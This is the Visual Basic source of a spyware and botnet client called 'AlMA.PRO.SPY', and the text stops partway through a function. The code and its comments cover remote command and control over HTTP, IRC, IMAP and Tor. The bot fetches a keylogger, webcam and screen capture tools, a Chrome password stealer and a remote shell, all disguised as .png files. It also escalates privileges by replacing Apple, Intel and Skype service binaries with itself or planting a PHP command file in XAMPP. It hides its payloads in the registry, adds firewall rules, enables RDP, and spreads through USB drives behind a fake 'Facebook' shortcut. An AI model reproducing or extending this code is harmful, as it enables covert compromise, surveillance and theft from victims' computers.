Imports System.ComponentModel
Imports System.DirectoryServices
Imports System.Management
Imports System.Net.Mail
Imports Microsoft.Win32
Module main
    Sub Main()
        Try
            If username = "SYSTEM" Then
                If IO.File.Exists(path & "\ZeroDays2System") Then
                    Dim p As Process = Process.GetProcessById(IO.File.ReadAllText(path & "\ZeroDays2System"))
                    IO.File.Delete(path & "\ZeroDays2System")
                    p.Kill()
                    IO.File.WriteAllText(p.MainModule.FileName.Replace(p.MainModule.ModuleName, "") & "zd2sys", Process.GetCurrentProcess.Id)
                    p.Start()
                    Threading.Thread.Sleep(60000)
                    End ' Perhapse failed!
                End If
                If IO.File.Exists(path & "\zd2sys") Then
                    Dim p As Process = Process.GetProcessById(IO.File.ReadAllText(path & "\zd2sys"))
                    IO.File.Delete(path & "\zd2sys")
                    Threading.Thread.Sleep(30000)
                    p.Kill()
                    IO.File.Delete(p.MainModule.FileName)
                    IO.File.Move(p.MainModule.FileName & "-zd2sys", p.MainModule.FileName)
                    log_all("Main function: ZeroDays2System section: Done exploiting Zero-Day (" & IO.File.ReadAllText(p.MainModule.FileName.Replace(p.MainModule.ModuleName, "") & "exploit") & ").", 3)
                    IO.File.Delete(p.MainModule.FileName.Replace(p.MainModule.ModuleName, "") & "exploit")
                End If
                If IO.File.Exists(path & "\xampp") Then
                    IO.File.Delete(IO.File.ReadAllText(path & "\xampp").Split("|")(0))
                    Process.GetProcessById(IO.File.ReadAllText(path & "\xampp").Split("|")(1)).Kill()
                    log_all("Main function: ZeroDays2System section: Done exploiting Zero-Day (XAMPP).", 3)
                    IO.File.Delete(path & "\xampp")
                End If
                Threading.Thread.Sleep(5000)
            End If
            If IO.File.Exists(path & "\check") Then
                Dim r = IO.File.ReadAllText(path & "\check")
                If r.Contains("WAIT") Then
                    Threading.Thread.Sleep(60000)
                    Try
                        IO.File.Delete(r.Split("|")(1))
                    Catch ex As Exception
                    End Try
                    log_all("Main function: ZeroDays2System section: Failed exploiting Zero-Day (CHECK)!", 0)
                ElseIf r.Contains("RUN") Then
                    Try
                        IO.File.WriteAllText(New IO.FileInfo(r.Split("|")(1)).DirectoryName & "\check", "DONE|" & Process.GetCurrentProcess.MainModule.FileName)
                    Catch ex As Exception
                    End Try
                    For Each p In Process.GetProcesses()
                        Try
                            If p.MainModule.FileName = r.Split("|")(1) Then
                                p.Kill()
                                Exit For
                            End If
                        Catch ex As Exception
                        End Try
                    Next
                    Try
                        Process.Start(r.Split("|")(1))
                        IO.File.Delete(path & "\check")
                    Catch ex As Exception
                    End Try
                    End
                ElseIf r.Contains("DONE") And username = "SYSTEM" Then
                    log_all("Main function: ZeroDays2System section: Done exploiting Zero-Day (CHECK).", 3)
                ElseIf r.Contains("DONE") And Not username = "SYSTEM" Then
                    If CH() Then
                        log_all("Main function: ZeroDays2System section: Done exploiting Zero-Day (CHECK). But we've only got higher!", 1)
                    Else
                        log_all("Main function: ZeroDays2System section: Failed exploiting Zero-Day (CHECK)!", 0)
                    End If
                End If
                Try
                    IO.File.Delete(r.Split("|")(1))
                Catch ex As Exception
                End Try
                IO.File.Delete(path & "\check")
            End If
        Catch ex As Exception
            log_all("Main function: ZeroDays2System section: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Try
            If Process.GetCurrentProcess.MainModule.FileName.ToLower.EndsWith("-update") Then
                Dim nn = Process.GetCurrentProcess.MainModule.FileName.Remove(Process.GetCurrentProcess.MainModule.FileName.Length - 7)
                For Each ps In Process.GetProcessesByName(nn.Split("/")(nn.Split("/").Length - 1))
                    ps.Kill()
                Next
                If IO.File.Exists(nn) Then IO.File.Delete(nn)
                IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, nn)
                Dim p = New Process
                p.StartInfo = New ProcessStartInfo("C:\windows\system32\cmd.exe", "/c """ & nn & """")
                p.StartInfo.UseShellExecute = False
                p.StartInfo.CreateNoWindow = True
                p.Start()
                End
            End If
            For Each f In IO.Directory.GetFiles(IO.Directory.GetCurrentDirectory)
                If f.ToLower.EndsWith("-update") Then
                    IO.File.Delete(f)
                End If
            Next
        Catch ex As Exception
            log_all("Main function: Update section: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Try
            a.Headers.Add(Net.HttpRequestHeader.UserAgent, "AlMA.PRO.SPY - " & version)
            a.Encoding = Text.Encoding.UTF8
            alma()
        Catch ex As Exception
            log_all("Main function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' DO NOT tamper with this
    Dim server As String = "http://SITE" ' Your server on which bots connect.
    Dim aps As String = "http://SITE/alma.pro.spy/" ' Path of AlMA.PRO.SPY on your server.
    Dim cc As String = "http://SITE/alma.pro.spy/extras/cc.png" 'cc is an exe that takes a snap of the webcam. This variable is the path from where to get it
    Dim nircmd As String = "http://SITE/alma.pro.spy/extras/nircmd.png" 'nircmd is an exe that takes a picture of the desktop. This variable is the path from where to get it
    Dim rcmd As String = "http://SITE/alma.pro.spy/extras/rcmd.png" 'rcmd is an exe that interacts with cmd in the background. This variable is the path from where to get it
    Dim kl As String = "http://SITE/alma.pro.spy/extras/kl.png" 'kl is an exe that works as KeyLogger. This variable is the path from where to get it
    Dim wfmf As String = "http://SITE/alma.pro.spy/extras/wfmf.png" 'wfmf is an exe that waits for specific files/folders on a specific Drive. This variable is the path from where to get it
    Dim password As String = "c2c9db77af078bbb162b79dc941de3b2" ' A password (in MD5) to prevent fake bots which can be changed from (connect.php).
    Dim botname As String = "VB Bot" ' Bot name
    Dim version As String = "0.3 - VB" ' Bot version (This one should never be changed [connection problems could appear]).
    Dim pcname As String = My.Computer.Name.ToUpper ' Computer name
    Dim username As String = Environment.UserName.ToUpper ' Username
    Dim osname As String = Split(My.Computer.Info.OSFullName.Replace("Microsoft ", ""), " ")(0) & " " & Split(My.Computer.Info.OSFullName.Replace("Microsoft ", ""), " ")(1) ' OS name [EX: Windows 7]
    Dim botid As String = "" ' Bot id (LEAVE IT BLANK).
    Dim install As String = "%TEMP%" ' Deprecated.
    Dim path As String = My.Application.Info.DirectoryPath ' Current path
    Dim logfile As String = path & "\AlMA.PRO.SPY.log" ' Log file's name
    Dim keysfile As String = path & "\AlMA.PRO.SPY.keys" ' KeyLogger file's name
    Dim configfile As String = path & "\AlMA.PRO.SPY.dat" ' Configuration file's name
    Dim a As Net.WebClient = New Net.WebClient ' A web client 
    Dim klp As Process ' KeyLogger Process
    Dim rcmdp As Process ' Remote CMD process
    Dim wtime As Integer = 5 * 60000 ' Wait time before connecting again [5Mins if not light].
    Dim ctimes As Integer = 1 ' A counter of times connected successfully (Not yet used).
    Dim imapserver As String = "imap.gmail.com" ' IMAP server to receive settings from (in case server is down and IRC blocking bots).
    Dim imapport As Integer = 993 ' IMAP port
    Dim imapuser As String = "" ' IMAP user name.
    Dim imappass As String = "" ' IMAP password [in Base64].
    Dim imapmaster As String = "" ' IMAP master which to get settings from.
    Dim apsshuser As String = "almapro" ' APSSH user name.
    Dim apsshpass As String = "c444858e0aaeb727da73d2eae62321ad" ' APSSH password [in MD5].
    Dim keepddos As Boolean = False ' DO NOT CHANGE
    Dim usbspread As Boolean = True ' Wether or NOT to spread over USB.
    Dim onTor As Boolean = True ' Connect on tor?
    Dim torP As Process = Nothing ' TOR process
    Dim polipoP As Process = Nothing ' POLIPO process
    Dim torProxy As String = "127.0.0.1:8123" ' Tor proxy (will be useful later with realeses).
    Dim TorProxies As String = "/alma.pro.spy/extras/tor.lst" ' Tor proxies list (will be useful later with realeses).
    Dim TorFiles As String = "/alma.pro.spy/extras/tor/" ' Tor files.
    Dim Unrar As String = "/unrar.exe" ' Unrar.exe binary
    Dim Unrar3dll As String = "/unrar3.dll" ' Unrar3.dll binary
    Dim IRCS As String = "irc.freenode.net" ' IRC server to connect on.
    Dim IRCP As Integer = 6667 ' IRC port.
    Dim IRCSSL As Boolean = False ' Is IRC over SSL?
    Dim IRCM As String = "" ' IRC Master from which special commands can be given (will add those commands once we decide them :P).
    Dim IRCB As String = "" ' IRC bot [check the explantion of what does it actualy do].
    Dim IRCCH As String = "" ' IRC channel.
    Dim IRCOnTor As Boolean = False ' Is IRC over TOR?
    Dim putty As String = "http://SITE/alma.pro.spy/extras/putty.png" ' Not yet ready!
    Dim Light As Boolean = True ' Be a Light version? (No screenshots [unless "dss" command is given], 24Hours to connect, etc...)
    Dim KeyLogDef As Boolean = False ' Start KeyLogger by default? (Disabled because problems appeard with the realese of version 0.2)
    Dim cl As String = "http://SITE/alma.pro.spy/extras/cl.png" ' Chrome Logins +800KB (check the methods of decrypting BLOB passwords).
    ' TODO: Features - 0.3
    ' TCP reverse connection: Connect back to me with TCP on a specific port. [DONE]
    ' TCP bind test/connection: Check for bind on a port and wait for connections if available. [DONE]
    ' TCP staright: Connect to a Host with TCP on a specific port. [DONE]
    ' APS_SSH: AlMA.PRO.SPY SSH same as. Connect to me and become a shell. (Works on all TCP functions). [DONE]
    ' IMAP settings: Send settings to bot over GMail and read them with IMAP. [DONE]
    ' CrackOff: Cracking passwords using bots. [Almost there]
    ' Idle: User's idle time. [DONE]
    ' CUH: Check if a Host is up including the server's one. [DONE]
    ' DDoS: Attack a Host/IP/Server with DDoS using bots. [DONE]
    ' IRC C&C: Connect to IRC and recive commands from there. [DONE]
    ' TorMode: Go way beyond the rules. [DONE]
    ' AVD: Detect Antivirus and Bypass it. [DONE]
    ' ZeroDays2System: Use Zero-Day exploits to gain system. [DONE]
    ' RDP: Enable/Disable Remote Desktop Protocol. [DONE]
    ' Share L&C: Share Listing and Control. [DONE]
    ' Users A/R: Add or Remove users. [DONE]
    ' SEV: Social engineer victims to do tasks (Phishing). [DONE]
    ' DIA: Detect important activities.
    ' DPT: Determine person's type.
    ' 1994Controller: Using port 1994 as a control port that supports HTTP requests.
    ' TODO: Improves - 0.3
    ' 1 - Hide even better. [DONE]
    ' 2 - More stability on Win 10 devices.
    ' 3 - APSSH/IRC check higher, can higher and get higher. [DONE]
    ' 4 - IRC id. [DONE]
    ' 5 - APSSH Commands fix + prelogin. [DONE]
    ' 6 - APSSH SPREAD_PATH. [DONE]
    ' 7 - APSSH Users list, add and remove. [DONE]
    ' 8 - APSSH RDP enable/disable. [DONE]
    ' 9 - APSSH ZeroDays2System exploit. [DONE]
    ' 10 - APSSH/IRC SEV usage. [DONE]
    ' 11 - SPREAD_PATH with all extras. [DONE]
    ' 12 - More Spread methods.
    ' 13 - Fix IRC commands missed up in version (0.2). [DONE]
    ' 14 - Migrator fix.
    ' 15 - AVD improving.
    ' 16 - Control more setting with IMAP/SS/APSSH.
    Function RegHide() As Boolean
        RegHide = False
        Try
            RegPush(Process.GetCurrentProcess.MainModule.FileName, Process.GetCurrentProcess.ProcessName)
            For Each f In {"cc.png", "wfmf.png", "rcmd.png", "kl.png", "nircmd.png", "cl.png"}
                Try
                    RegPush(path & "\" & f, f)
                Catch ex As Exception
                End Try
            Next
            If IO.Directory.Exists(path & "\Tor") Then
                Try
                    For Each f In IO.Directory.GetFiles(path & "\Tor")
                        Try
                            RegPush(f, f.Remove(0, f.LastIndexOf("\") + 1), True)
                        Catch ex As Exception
                        End Try
                    Next
                Catch ex As Exception
                End Try
            End If
            Return True
        Catch ex As Exception
            log_all("RegHide function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Special crafted Function to hide files in registery.
    Sub RegPush(p As String, n As String, Optional tor As Boolean = False)
        Try
            If Not IO.File.Exists(p) Then Exit Sub
            Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
            If tor Then rgkey = rgkey.CreateSubKey("Tor", RegistryKeyPermissionCheck.ReadWriteSubTree)
            Dim byts = IO.File.ReadAllBytes(p)
            Dim byt As New List(Of Byte)
            Dim lc = 0
            For Each b In byts
                byt.Add(b)
                If byt.Count = 500 * 1024 Then
                    rgkey.SetValue(n & "-" & GTC(lc, "0000"), byt.ToArray, RegistryValueKind.Binary)
                    byt.Clear()
                    lc += 1
                End If
            Next
            If byt.Count > 0 Then
                If lc > 0 Then
                    rgkey.SetValue(n & "-" & GTC(lc, "0000"), byt.ToArray, RegistryValueKind.Binary) : byt.Clear()
                Else
                    rgkey.SetValue(n, byt.ToArray, RegistryValueKind.Binary) : byt.Clear()
                End If
            End If
        Catch ex As Exception
            log_all("RegPush function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Special crafted function to push files into registery.
    Sub RegPool(n As String, d As String, Optional tor As Boolean = False)
        Try
            Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
            If tor Then rgkey = rgkey.CreateSubKey("Tor", RegistryKeyPermissionCheck.ReadWriteSubTree)
            If BS(rgkey.GetValue(n)) = "" Then
                If BS(rgkey.GetValue(n & "-0000")) = "" Then
                    Exit Sub
                Else
                    For Each v In rgkey.GetValueNames
                        If v.StartsWith(n) Then
                            Dim byts As New List(Of Byte)
                            If IO.File.Exists(d) Then byts.AddRange(IO.File.ReadAllBytes(d))
                            byts.AddRange(rgkey.GetValue(v))
                            IO.File.WriteAllBytes(d, byts.ToArray)
                            byts.Clear()
                        End If
                    Next
                End If
            Else
                IO.File.WriteAllBytes(d, rgkey.GetValue(n))
            End If
        Catch ex As Exception
            log_all("RegPool function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Special crafted function to pool files out of registery that were hidden by RegHide.
    Function RegCheck(n As String, Optional tor As Boolean = False) As Boolean
        RegCheck = False
        Try
            Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
            If tor Then rgkey = rgkey.CreateSubKey("Tor", RegistryKeyPermissionCheck.ReadWriteSubTree)
            If Not BS(rgkey.GetValue(n)) = "" Or Not BS(rgkey.GetValue(n & "-0000")) = "" Then Return True
        Catch ex As Exception
            log_all("RegCheck function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Special crafted function to check registery for files hidden by RegHide.
    Function LShare() As String
        LShare = ""
        Try
            LShare = "Share servers around:" & vbNewLine
            For Each s In GPO("cmd", "/C net view").Split(vbNewLine)
                s = s.Replace(vbLf, "")
                If s.StartsWith("\\") Then
                    Dim f = s.Split(" ")(0)
                    Dim sc = s.Replace(f, "")
                    Dim sec = s.Replace(f, " ")
                    Do While sec.StartsWith(" ")
                        sec = sec.Remove(0, 1)
                    Loop
                    Do While sec.EndsWith(" ")
                        sec = sec.Remove(sec.Length - 1, 1)
                    Loop
                    LShare += f & "|" & sec
                End If
            Next
            LShare += vbNewLine & "Shares on this machine:" & vbNewLine
            For Each l In GPO("cmd", "/C net share").Split(vbNewLine)
                If l.Contains("$") And l.Contains(":\") Then
                    l = l.Replace(vbLf, "")
                    For Each prt In Split(l, "  ")
                        If prt.StartsWith(" ") Then prt = prt.Remove(0, 1)
                        If Not prt = "" Then
                            LShare += prt & "|"
                        End If
                    Next
                    LShare = LShare.Remove(LShare.Length - 1) & vbNewLine
                End If
            Next
            LShare = LShare.Remove(LShare.Length - 1)
        Catch ex As Exception
            log_all("LShare function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' List shares.
    Function AShare(sn As String, p As String, Optional u As String = "") As Boolean
        AShare = False
        Try
            If u = "" Then u = username
            If Not sn.EndsWith("$") Then sn += "$"
            If Not IO.Directory.Exists(p) Then log_all("AShare function: Share path does not exist!") : Return False
            Dim s = GPO("cmd", "/C net share " & sn & "=""" & p & """ /GRANT:" & u & ",FULL")
            If s.StartsWith(sn & " was shared successfully.") Then Return True
        Catch ex As Exception
            log_all("LShare function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Add a share.
    Function DShare(sn As String) As Boolean
        DShare = False
        Try
            If Not sn.EndsWith("$") Then sn += "$"
            Dim s = GPO("cmd", "/C net share " & sn & " /DELETE")
            If s.StartsWith(sn & " was deleted successfully.") Then Return True
        Catch ex As Exception
            log_all("LShare function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Delete a share.
    Function ERDP() As Boolean
        ERDP = True
        Try
            My.Computer.Registry.LocalMachine.OpenSubKey("System\CurrentControlSet\Control\Terminal Server", True).SetValue("fDenyTSConnections", 0)
        Catch ex As Exception
            log_all("ERDP function: " & ex.Message & vbNewLine & ex.StackTrace)
            Return False
        End Try
    End Function ' Enable Remote Desktop Protocol.
    Function DRDP() As Boolean
        DRDP = True
        Try
            My.Computer.Registry.LocalMachine.OpenSubKey("System\CurrentControlSet\Control\Terminal Server", True).SetValue("fDenyTSConnections", 1)
        Catch ex As Exception
            log_all("DRDP function: " & ex.Message & vbNewLine & ex.StackTrace)
            Return False
        End Try
    End Function ' Disable Remote Desktop Protocol.
    Function ZeroDays2System() As Boolean
        If username = "SYSTEM" Or CH() Then Return True
        Try
            For Each exploit In {"CHECK", "Intel", "XAMPP", "Apple", "Skype"}
                Try
                    Select Case exploit.ToLower
                        Case "check"
                            Dim s = GPO("cmd", "/C wmic " & My.Resources.wmic)
                            For Each l In s.Split(vbNewLine)
                                If Not l.ToLower.Contains(".exe ") Then GoTo skp
                                Dim p = l.Split(".exe ")(0) & ".exe"
                                Dim pi As Boolean = False
                                If p.Split(" ").Length > 2 Then
                                    If Not p.Split(" ")(2).ToLower.EndsWith(".exe") Then pi = True
                                End If
                                If pi Then
                                    Dim ne = p.Split(" ")(0) & " " & p.Split(" ")(1) & " " & p.Split(" ")(2) & ".exe"
                                    If IO.File.Exists(ne) Then
                                        If IO.File.Exists(New IO.FileInfo(ne).DirectoryName & "\check") Then
                                            log_all("ZeroDays2System function: Looks like CHECK exploit service (" & p & ") is already waiting to be exploited!", 1)
                                            GoTo skp
                                        End If
                                    End If
                                    Try
                                        IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, ne)
                                        IO.File.WriteAllText(New IO.FileInfo(ne).DirectoryName & "\check", "RUN|" & Process.GetCurrentProcess.MainModule.FileName)
                                        IO.File.WriteAllText(path & "\check", "WAIT|" & ne)
                                        log_all("ZeroDays2System function: CHECK exploit might be working! Waiting for a reboot so the service (" & p & ") is used to gain system.", 1)
                                        Exit For
                                    Catch ex As Exception
                                    End Try
                                End If
skp:
                            Next
                        Case "apple"
                            For Each pth In {"C:\Program Files", "C:\Program Files (x86)"}
                                If IO.File.Exists(pth & "\Common Files\Apple\Mobile Device Support\AppleMobileDeviceService.exe") Then
                                    For Each p In Process.GetProcessesByName("AppleMobileDeviceService")
                                        p.Kill()
                                    Next
                                    IO.File.Move(pth & "\Common Files\Apple\Mobile Device Support\AppleMobileDeviceService.exe", pth & "\Common Files\Apple\Mobile Device Support\AppleMobileDeviceService.exe-zd2sys")
                                    IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, pth & "\Common Files\Apple\Mobile Device Support\AppleMobileDeviceService.exe")
                                    IO.File.WriteAllText(pth & "\Common Files\Apple\Mobile Device Support\ZeroDays2System", Process.GetCurrentProcess.Id)
                                    IO.File.WriteAllText(pth & "\Common Files\Apple\Mobile Device Support\exploit", exploit)
                                    Dim pro = New Process()
                                    pro.StartInfo = New ProcessStartInfo(pth & "\iTunes\iTunes.exe")
                                    pro.StartInfo.UseShellExecute = False
                                    pro.StartInfo.CreateNoWindow = True
                                    pro.Start()
                                    Threading.Thread.Sleep(30000)
                                    pro.Kill()
                                    Threading.Thread.Sleep(60000)
                                End If
                            Next
                        Case "intel"
                            For Each pth In {"C:\Program Files", "C:\Program Files (x86)"}
                                If IO.File.Exists(pth & "\Intel\Intel(R) Management Engine Components\LMS\LMS.exe") Then
                                    For Each p In Process.GetProcessesByName("LMS")
                                        p.Kill()
                                    Next
                                    IO.File.Move(pth & "\Intel\Intel(R) Management Engine Components\LMS\LMS.exe", pth & "\Intel\Intel(R) Management Engine Components\LMS\LMS.exe-zd2sys")
                                    IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, pth & "\Intel\Intel(R) Management Engine Components\LMS\LMS.exe")
                                    IO.File.WriteAllText(pth & "\Intel\Intel(R) Management Engine Components\LMS\ZeroDays2System", Process.GetCurrentProcess.Id)
                                    IO.File.WriteAllText(pth & "\Intel\Intel(R) Management Engine Components\LMS\exploit", exploit)
                                    Threading.Thread.Sleep(60000)
                                End If
                            Next
                        Case "xampp"
                            For Each d In My.Computer.FileSystem.Drives
                                If d.IsReady Then
                                    If d.DriveType = IO.DriveType.Fixed Then
                                        For Each p In IO.Directory.GetDirectories(d.Name, "xampplite")
                                            If IO.Directory.Exists(p & "\htdocs") Then
                                                IO.File.WriteAllText(p & "\htdocs\exploit.php", "<?php $exe=""" & Process.GetCurrentProcess.MainModule.FileName & """; pclose(popen('start /B cmd /C ""'.$exe.'""', 'r')); ?>")
                                                IO.File.WriteAllText(path & "\xampp", p & "\htdocs\exploit.php|" & Process.GetCurrentProcess.Id)
                                                Dim s = New Net.WebClient().DownloadData("http://127.0.0.1/exploit.php")
                                                Threading.Thread.Sleep(60000)
                                            End If
                                        Next
                                    End If
                                End If
                            Next
                        Case "skype"
                            For Each pth In {"C:\Program Files", "C:\Program Files (x86)"}
                                If IO.File.Exists(pth & "\Skype\Updater\Updater.exe") Then
                                    For Each p In Process.GetProcessesByName("Updater")
                                        If p.MainModule.FileName = pth & "\Skype\Updater\Updater.exe" Then
                                            p.Kill()
                                        End If
                                    Next
                                    IO.File.Move(pth & "\Skype\Updater\Updater.exe", pth & "\Skype\Updater\Updater.exe-zd2sys")
                                    IO.File.Copy(Process.GetCurrentProcess.MainModule.FileName, pth & "\Skype\Updater\Updater.exe")
                                    IO.File.WriteAllText(pth & "\Skype\Updater\ZeroDays2System", Process.GetCurrentProcess.Id)
                                    IO.File.WriteAllText(pth & "\Skype\Updater\exploit", exploit)
                                    Dim pro = New Process()
                                    pro.StartInfo = New ProcessStartInfo("C:\Windows\ehome\ehshell.exe")
                                    pro.StartInfo.UseShellExecute = False
                                    pro.StartInfo.CreateNoWindow = True
                                    pro.Start()
                                    Threading.Thread.Sleep(30000)
                                    pro.Kill()
                                    Threading.Thread.Sleep(60000)
                                End If
                            Next
                    End Select
                Catch ex As Exception
                    log_all("ZeroDays2System function: Exploiting ==> " & exploit & ": " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            Next
        Catch ex As Exception
            log_all("ZeroDays2System function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Return False
    End Function ' Zero-day exploits function.
    Function GetSerial(drive As String) As String
        Dim objMOS As ManagementObjectSearcher = New ManagementObjectSearcher("SELECT * FROM Win32_Volume")
        For Each objMO In objMOS.Get()
            If objMO.GetPropertyValue("Name").tolower = drive.ToLower Then
                Return objMO.GetPropertyValue("SerialNumber")
            End If
        Next
        Return GetRND()
    End Function ' Get a hard drive Serial number.
    Function netshItup(n As String, p As String) As Boolean
        netshItup = False
        If IO.File.Exists(path & "\cc.png") Then Return False
        Dim pc As New ProcessStartInfo("c:\windows\system32\netsh.exe", "advfirewall firewall add rule name=""" + n + """ dir=in action=allow program=""" + p + """ enable=yes")
        pc.UseShellExecute = True
        pc.Verb = "runas"
        pc.WindowStyle = ProcessWindowStyle.Hidden
        netshItup = Process.Start(pc).WaitForExit(5000)
    End Function ' Use netsh to add rules into the firewall.
    Function GPO(cmd As String, Optional args As String = "", Optional startin As String = "") As String
        GPO = ""
        Try
            Dim p = New Process
            p.StartInfo = New ProcessStartInfo(cmd, args)
            If startin <> "" Then p.StartInfo.WorkingDirectory = startin
            p.StartInfo.RedirectStandardOutput = True
            p.StartInfo.RedirectStandardError = True
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start()
            p.WaitForExit()
            Dim s = p.StandardOutput.ReadToEnd
            s += p.StandardError.ReadToEnd
            GPO = s
        Catch ex As Exception
            log_all("GPO function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Get Process Output.
    Function CanH() As Boolean
        CanH = False
        Dim s = GPO("c:\windows\system32\cmd.exe", "/c whoami /all | findstr /I /C:""S-1-5-32-544""")
        If s.Contains("S-1-5-32-544") Then CanH = True
    End Function ' Check if can get Higher.
    Function CH() As Boolean
        CH = False
        Dim s = GPO("c:\windows\system32\cmd.exe", "/c whoami /all | findstr /I /C:""S-1-16-12288""")
        If s.Contains("S-1-16-12288") Then CH = True
        If username.ToLower = "system" Then CH = True
    End Function ' Check if Higher.
    Function GH() As Boolean
        GH = False
        If Not CH() Then
            Dim pc As New ProcessStartInfo("c:\windows\system32\cmd.exe", "/c start " & Process.GetCurrentProcess.MainModule.FileName)
            pc.UseShellExecute = True
            pc.Verb = "runas"
            pc.WindowStyle = ProcessWindowStyle.Hidden
            Try
                Dim p = Process.Start(pc)
                Do Until p.HasExited
                Loop
                If p.ExitCode = 0 Then
                    Return True
                End If
            Catch ex As Exception
                Return False
            End Try
        Else
            If username = "SYSTEM" Then Return False
            If GPO("c:\windows\system32\cmd.exe", "/C schtasks /create /tn " & botid & "-system /TR ""c:\windows\system32\cmd.exe /C " & Process.GetCurrentProcess.MainModule.FileName & """ /sc onlogon /ru system /rl highest /f").Contains("successfully") Then
                GPO("c:\windows\system32\cmd.exe", "/C schtasks /run /tn " & botid & "-system")
                GPO("c:\windows\system32\cmd.exe", "/C schtasks /delete /tn " & botid & "-system /f")
                GH = True
            End If
        End If
    End Function ' Get Higher.
    Function CSC(exe As String, args As String, p As String, n As String) As Boolean
        Dim oShell As Object
        Dim oLink As Object
        CSC = True
        Try
            oShell = CreateObject("WScript.Shell")
            oLink = oShell.CreateShortcut(p & "\" & n & ".lnk")
            oLink.TargetPath = exe
            oLink.Arguments = args
            oLink.WindowStyle = 7
            oLink.Description = n
            oLink.IconLocation = "C:\Windows\System32\SHELL32.dll, 13"
            oLink.Save()
        Catch ex As Exception
            log_all("CSC function: " & ex.Message & vbNewLine & ex.StackTrace)
            Return False
        End Try
    End Function ' Create ShortCute.
    Function FMAN_OW(f As String) As Boolean
        FMAN_OW = True
        Try
            GPO("Rundll32", "Shell32.dll,OpenAs_RunDLL " & f)
        Catch ex As Exception
            Return False
        End Try
    End Function ' FileManager OpenWith (Not yet Ready [DO NOT USE]).
    Sub alma()
        CMP()
        LS()
        Dim subw As New BackgroundWorker() ' StartUp BackgroundWorker
        AddHandler subw.DoWork, Sub(sender As Object, e As DoWorkEventArgs)
                                    While True
                                        Try
                                            If CH() Then
                                                regdel("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", botid)
                                                IO.File.WriteAllText(path & "\startup.xml", My.Resources.task.Replace("^P^", pcname).Replace("^U^", username).Replace("^N^", Process.GetCurrentProcess.ProcessName).Replace("^E^", "exe"))
                                                If Not GPO("c:\windows\system32\cmd.exe", "/C schtasks /create /F /tn " & botid & " /XML """ & path & "\startup.xml""").Contains("successfully") Then
                                                    regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", botid, My.Resources.powershell.Replace("^N^", Process.GetCurrentProcess.ProcessName).Replace("^E^", "exe"))
                                                End If
                                                IO.File.Delete(path & "\startup.xml")
                                            Else
                                                regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", botid, My.Resources.powershell.Replace("^N^", Process.GetCurrentProcess.ProcessName).Replace("^E^", "exe"))
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Threading.Thread.Sleep(15000)
                                    End While
                                End Sub
        subw.RunWorkerAsync()
        Dim t As New Threading.Thread(New Threading.ThreadStart(AddressOf IRCC))
        t.Start()
        If onTor Then
            TorMode()
        End If
        If KeyLogDef Then
            Try
                log_all("alma function: Key Logger is up.", 3)
                EKL()
            Catch ex As Exception
                log_all("alma function: Key Logger section: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        End If
        If usbspread Then
            log_all("alma function: USB spreading is up.", 3)
            Dim th As New Threading.Thread(New Threading.ThreadStart(AddressOf USB_SPREAD))
            th.Start()
        End If
        If Light Then wtime = 24 * 60 * 60000
        GTM()
    End Sub ' Prepareration function. 
    Sub USB_SPREAD()
        Do While True
            For Each d In My.Computer.FileSystem.Drives
                If d.IsReady Then
                    If d.DriveType = IO.DriveType.Removable Then
                        Try
                            SPREAD_PATH(d.RootDirectory.FullName)
                        Catch ex As Exception
                            log_all("GTM function: spread section: " & ex.Message & vbNewLine & ex.StackTrace)
                        End Try
                    End If
                End If
            Next
            Threading.Thread.Sleep(15000)
        Loop
    End Sub ' USB Spread thread.
    Sub SPREAD_PATH(p As String)
        Try
            For Each f In {"cc.png", "wfmf.png", "rcmd.png", "kl.png", "nircmd.png", "cl.png"}
                Try
                    If IO.File.Exists(p & "\" & f) Then IO.File.Delete(p & "\" & f)
                    RegPool(f, p & "\" & f)
                    IO.File.SetAttributes(p & "\" & f, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
                Catch ex As Exception
                End Try
            Next
            If IO.File.Exists(path & "\Tor") And Not IO.Directory.Exists(p & "\Tor") Then
                IO.Directory.CreateDirectory(p & "\Tor")
                IO.File.SetAttributes(p & "\Tor", IO.FileAttributes.Hidden Or IO.FileAttributes.System)
                For Each f In IO.Directory.GetFiles(path & "\Tor")
                    Try
                        IO.File.Copy(f, p & "\Tor\" & f.Remove(0, f.LastIndexOf("\") + 1))
                    Catch ex As Exception
                    End Try
                Next
            End If
            Dim n = Process.GetCurrentProcess.MainModule.ModuleName
            If IO.File.Exists(p & "\" & n) Then IO.File.Delete(p & "\" & n)
            IO.File.Copy(path & "\" & n, p & "\" & n)
            IO.File.SetAttributes(p & "\" & n, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
            CSC("cmd", "/C start \" & n & " && explorer http://fb.me", p, "Facebook")
